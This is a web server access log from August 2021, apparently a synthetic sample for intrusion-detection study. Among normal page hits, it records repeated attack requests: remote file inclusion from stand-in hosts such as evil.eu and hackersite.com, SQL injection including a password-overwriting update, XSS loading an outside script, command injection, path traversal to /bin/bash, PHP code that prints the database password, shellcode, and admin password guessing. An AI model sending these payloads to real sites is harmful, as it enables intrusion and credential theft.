115.221.121.44 - - [09/Aug/2021:11:40:58 +0200] "GET /?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php HTTP/1.0" 400 88968 "/register.php/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
115.221.121.44 - - [09/Aug/2021:11:40:58 +0200] "GET /?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php HTTP/1.0" 400 70278 "/register.php/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
115.221.121.44 - - [09/Aug/2021:11:40:58 +0200] "GET /?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php HTTP/1.0" 400 88868 "/register.php/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
115.221.121.44 - - [09/Aug/2021:11:40:58 +0200] "GET /?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php HTTP/1.0" 400 68740 "/register.php/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
115.221.121.44 - - [09/Aug/2021:11:40:58 +0200] "GET /?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php HTTP/1.0" 400 86654 "/register.php/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
115.221.121.44 - - [09/Aug/2021:11:40:58 +0200] "GET /?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php HTTP/1.0" 400 31139 "/register.php/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
115.221.121.44 - - [09/Aug/2021:11:40:58 +0200] "GET /?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php HTTP/1.0" 400 63087 "/register.php/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
115.221.121.44 - - [09/Aug/2021:11:40:58 +0200] "GET /?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php HTTP/1.0" 400 15028 "/register.php/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
115.221.121.44 - - [09/Aug/2021:11:40:58 +0200] "GET /?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php HTTP/1.0" 400 54212 "/register.php/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
220.243.135.5 - - [09/Aug/2021:11:41:08 +0200] "GET /connection.php/.well-known/assetlinks.json HTTP/1.1" 200 24838 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
91.138.198.224 - - [09/Aug/2021:11:41:09 +0200] "GET /\xf9\xa9\xa5\xcc\xa87\x17,b\xfe%\xb4C\x8f\xf3\xf9\xd4\xb4K\xb9Z\x90\x06>?\xf6\xddz\xf3P\xd3{\xa8 HTTP/1.0" 504 58287 "/login.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
54.36.149.52 - - [09/Aug/2021:11:41:10 +0200] "GET /update.php/?post=%3script%3ealert(1); HTTP/1.0" 400 86515 "/api/v1/login/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [09/Aug/2021:11:41:11 +0200] "GET /api/v1/register/?customerId=1OR%201=1 HTTP/1.0" 200 27824 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [09/Aug/2021:11:41:12 +0200] "GET /api/v1/orders/?username=admin&password=1237 HTTP/1.0" 200 5081 "/register.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
182.34.27.162 - - [09/Aug/2021:11:41:13 +0200] "GET /register.php/ HTTP/1.1" 200 29108 "/api/v1/register/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
62.109.16.162 - - [09/Aug/2021:11:41:14 +0200] "GET /orders.php/ HTTP/1.0" 400 47488 "/login.php/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
115.221.121.44 - - [09/Aug/2021:11:41:15 +0200] "GET /?file=http://evil.eu/sh HTTP/1.0" 200 9124 "/register.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:41:16 +0200] "GET /connection.php/?post==<?php print $settings[database][password]; ?> HTTP/1.0" 200 46074 "/core/files/js/upload.js/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
87.251.81.179 - - [09/Aug/2021:11:41:17 +0200] "GET /page/about-us/ HTTP/1.0" 200 55595 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:41:17 +0200] "GET /page/about-us/ HTTP/1.0" 200 30451 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:41:17 +0200] "GET /page/about-us/ HTTP/1.0" 200 2828 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:41:17 +0200] "GET /page/about-us/ HTTP/1.0" 200 63137 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:41:17 +0200] "GET /page/about-us/ HTTP/1.0" 200 24424 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
115.221.121.44 - - [09/Aug/2021:11:41:22 +0200] "GET /api/v1/customers/?username=admin&password=1236 HTTP/1.1" 200 77835 "/connection.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
87.251.81.179 - - [09/Aug/2021:11:41:23 +0200] "GET /?session=duf8423ufdjr49cce3ije33ssaq2223 HTTP/1.0" 200 24622 "/core/files/js/upload.js/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
220.243.135.5 - - [09/Aug/2021:11:41:24 +0200] "GET /login.php/ HTTP/1.0" 200 6269 "/api/v1/login/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
45.61.164.120 - - [09/Aug/2021:11:41:25 +0200] "GET /update.php/?ip=|+ls+-l HTTP/1.0" 200 65063 "/login.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
115.221.121.44 - - [09/Aug/2021:11:41:26 +0200] "GET /index.php/ HTTP/1.0" 404 28033 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
121.225.26.201 - - [09/Aug/2021:11:41:27 +0200] "GET /register.php/ HTTP/1.0" 403 57992 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
209.133.212.79 - - [09/Aug/2021:11:41:28 +0200] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 84572 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
209.133.212.79 - - [09/Aug/2021:11:41:28 +0200] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 22393 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
209.133.212.79 - - [09/Aug/2021:11:41:28 +0200] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 55288 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
209.133.212.79 - - [09/Aug/2021:11:41:28 +0200] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 4753 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
209.133.212.79 - - [09/Aug/2021:11:41:28 +0200] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 60334 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
121.225.26.201 - - [09/Aug/2021:11:41:33 +0200] "GET /?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 200 88868 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
45.61.164.120 - - [09/Aug/2021:11:41:34 +0200] "GET /index.php/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.1" 404 73575 "/blog/how-to-shop/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
209.133.212.79 - - [09/Aug/2021:11:41:35 +0200] "POST /?username=admin&password=1235 HTTP/1.0" 200 3605 "/login.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
54.36.149.52 - - [09/Aug/2021:11:41:36 +0200] "GET /login.php/?ip=|+ls+-l HTTP/1.0" 403 80194 "/api/v1/login/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
115.221.121.44 - - [09/Aug/2021:11:41:37 +0200] "GET /register.php/?file=http://evil.eu/root.asp HTTP/1.0" 403 83975 "/login.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
209.133.212.79 - - [09/Aug/2021:11:41:38 +0200] "GET /update.php/?username=admin&password=1237 HTTP/1.0" 200 27397 "/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
62.109.16.162 - - [09/Aug/2021:11:41:39 +0200] "GET /api/v1/customers/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php HTTP/1.0" 200 20755 "/core/files/js/editor.js/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
121.225.26.201 - - [09/Aug/2021:11:41:40 +0200] "GET /login.php/?id=0%20or%201=1 HTTP/1.1" 200 9423 "/api/v1/login/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
62.109.16.162 - - [09/Aug/2021:11:41:41 +0200] "GET /index.php/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 200 38681 "/" "Mozilla/5.0 (Windows NT 6.2; rv:43.0) Gecko/20100101 Firefox/43.0"
209.133.212.79 - - [09/Aug/2021:11:41:42 +0200] "GET /api/v1/login/ HTTP/1.0" 404 1069 "/register.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
62.109.16.162 - - [09/Aug/2021:11:41:43 +0200] "GET /index.php/ HTTP/1.0" 200 87668 "/index.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0"
87.251.81.179 - - [09/Aug/2021:11:41:44 +0200] "GET /?username=admin&password=1234 HTTP/1.1" 200 18907 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:41:44 +0200] "GET /?username=admin&password=1234 HTTP/1.1" 200 18997 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:41:44 +0200] "GET /?username=admin&password=1234 HTTP/1.1" 200 8184 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:41:44 +0200] "GET /?username=admin&password=1234 HTTP/1.1" 200 11297 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:41:44 +0200] "GET /?username=admin&password=1234 HTTP/1.1" 200 74259 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [09/Aug/2021:11:41:49 +0200] "GET / HTTP/1.0" 200 30799 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
182.34.27.162 - - [09/Aug/2021:11:41:50 +0200] "GET /update.php/?username=admin&password=admin HTTP/1.0" 200 49275 "/page/about-us/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
183.87.255.54 - - [09/Aug/2021:11:41:51 +0200] "GET /login.php/ HTTP/1.1" 200 29690 "/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
5.13.35.65 - - [09/Aug/2021:11:41:52 +0200] "GET /xmlrpc.php/?customerId=1OR%201=1 HTTP/1.0" 200 68962 "/core/files/js/upload.js/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
31.184.238.22 - - [09/Aug/2021:11:41:53 +0200] "GET /update.php/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 60577 "/api/v1/orders/" "Mozilla/5.0 (Android; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0"
87.251.81.179 - - [09/Aug/2021:11:41:54 +0200] "GET /api/v1/register/?file=http://evil.eu/sh HTTP/1.0" 404 80241 "/connection.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36"
1.2.169.95 - - [09/Aug/2021:11:41:55 +0200] "GET /register.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 403 68407 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
1.2.169.95 - - [09/Aug/2021:11:41:55 +0200] "GET /register.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 403 55834 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
1.2.169.95 - - [09/Aug/2021:11:41:55 +0200] "GET /register.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 403 6759 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
1.2.169.95 - - [09/Aug/2021:11:41:55 +0200] "GET /register.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 403 78405 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
1.2.169.95 - - [09/Aug/2021:11:41:55 +0200] "GET /register.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 403 5979 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
54.36.149.94 - - [09/Aug/2021:11:42:00 +0200] "GET /update.php/?session=duf8423ufdjr49cce3ije33ssaq2223 HTTP/1.0" 200 74540 "/login.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
5.13.35.65 - - [09/Aug/2021:11:42:01 +0200] "GET /api/v1/login/?page=http://192.168.80.128/rfi.php HTTP/1.1" 200 6725 "/index.php/" "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
182.34.27.162 - - [09/Aug/2021:11:42:02 +0200] "GET /?session=duf8423ufdjr49cce3ije33ssaq2223 HTTP/1.0" 403 20466 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
31.184.238.22 - - [09/Aug/2021:11:42:03 +0200] "GET /core/files/js/editor.js/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 34580 "/blog/better-products-for-2019/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
31.184.238.22 - - [09/Aug/2021:11:42:03 +0200] "GET /core/files/js/editor.js/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 46439 "/blog/better-products-for-2019/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
31.184.238.22 - - [09/Aug/2021:11:42:03 +0200] "GET /core/files/js/editor.js/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 82349 "/blog/better-products-for-2019/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
31.184.238.22 - - [09/Aug/2021:11:42:03 +0200] "GET /core/files/js/editor.js/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 8748 "/blog/better-products-for-2019/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
31.184.238.22 - - [09/Aug/2021:11:42:03 +0200] "GET /core/files/js/editor.js/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 17836 "/blog/better-products-for-2019/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
31.184.238.22 - - [09/Aug/2021:11:42:03 +0200] "GET /core/files/js/editor.js/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 39153 "/blog/better-products-for-2019/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
31.184.238.22 - - [09/Aug/2021:11:42:03 +0200] "GET /core/files/js/editor.js/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 38832 "/blog/better-products-for-2019/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
31.184.238.22 - - [09/Aug/2021:11:42:03 +0200] "GET /core/files/js/editor.js/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 63600 "/blog/better-products-for-2019/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
31.184.238.22 - - [09/Aug/2021:11:42:03 +0200] "GET /core/files/js/editor.js/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 29334 "/blog/better-products-for-2019/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
31.184.238.22 - - [09/Aug/2021:11:42:03 +0200] "GET /core/files/js/editor.js/?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 39364 "/blog/better-products-for-2019/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
69.46.0.142 - - [09/Aug/2021:11:42:13 +0200] "GET /api/v1/register/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 200 10763 "/update.php/" "Mozilla/5.0 (X11; OpenBSD amd64; rv:42.0) Gecko/20100101 Firefox/42.0"
69.46.0.142 - - [09/Aug/2021:11:42:14 +0200] "GET /connection.php/?username=admin&password=1238 HTTP/1.0" 404 19213 "/login.php/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.52 Safari/537.36 OPR/31.0.1889.50 (Edition beta)"
1.2.169.95 - - [09/Aug/2021:11:42:15 +0200] "GET /update.php/?username=admin&password=admin2 HTTP/1.0" 200 70276 "/xmlrpc.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
103.36.79.144 - - [09/Aug/2021:11:42:16 +0200] "GET /?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 28707 "/api/v1/register/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
209.133.212.79 - - [09/Aug/2021:11:42:17 +0200] "GET /index.php/?file=http://evil.eu/root.asp HTTP/1.1" 200 82389 "/register.php/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
115.221.121.44 - - [09/Aug/2021:11:42:18 +0200] "POST /?data=%3cscript%20src=%22http%3a%2f%2fwww.hacckingplace.com%2fnasty.js%22%3e%3c%2fscript%3e HTTP/1.0" 200 86162 "/core/files/js/editor.js/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
54.36.149.94 - - [09/Aug/2021:11:42:19 +0200] "GET /index.php/?post=%3script%3ealert(1); HTTP/1.1" 200 7299 "/api/v1/login/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
220.243.135.5 - - [09/Aug/2021:11:42:20 +0200] "GET /core/files/js/upload.js/?username=admin&password=1235 HTTP/1.0" 200 59021 "/login.php/" "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
121.225.26.201 - - [09/Aug/2021:11:42:21 +0200] "GET /index.php/ HTTP/1.0" 200 70384 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
54.36.149.52 - - [09/Aug/2021:11:42:22 +0200] "GET /orders.php/?username=admin&password=1237 HTTP/1.0" 504 74231 "/login.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36 OPR/30.1835.49 (Edition beta)"
54.36.149.94 - - [09/Aug/2021:11:42:23 +0200] "GET /?id=0%20or%201=1 HTTP/1.0" 200 43333 "/api/v1/register/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
54.36.149.94 - - [09/Aug/2021:11:42:24 +0200] "GET /orders.php/\xf5@~\xcc\r\xfdKJ\x0c=u[c\xfb+3\x88\xd2%z HTTP/1.0" 200 62343 "/api/v1/customers/" "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
209.133.212.79 - - [09/Aug/2021:11:42:25 +0200] "GET /login.php/?page=1&customerId=AND%id%IS%NULL; HTTP/1.1" 200 45218 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) rekonq/2.4.2 Safari/537.21"
220.243.135.5 - - [09/Aug/2021:11:42:26 +0200] "GET /api/v1/register/?id=0%20or%201=1 HTTP/1.0" 200 76863 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
182.34.27.162 - - [09/Aug/2021:11:42:27 +0200] "GET /index.php/?username=admin&password=1239 HTTP/1.0" 200 13044 "/connection.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
182.34.27.162 - - [09/Aug/2021:11:42:27 +0200] "GET /index.php/?username=admin&password=1239 HTTP/1.0" 200 32047 "/connection.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
182.34.27.162 - - [09/Aug/2021:11:42:27 +0200] "GET /index.php/?username=admin&password=1239 HTTP/1.0" 200 88288 "/connection.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
182.34.27.162 - - [09/Aug/2021:11:42:27 +0200] "GET /index.php/?username=admin&password=1239 HTTP/1.0" 200 59808 "/connection.php/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
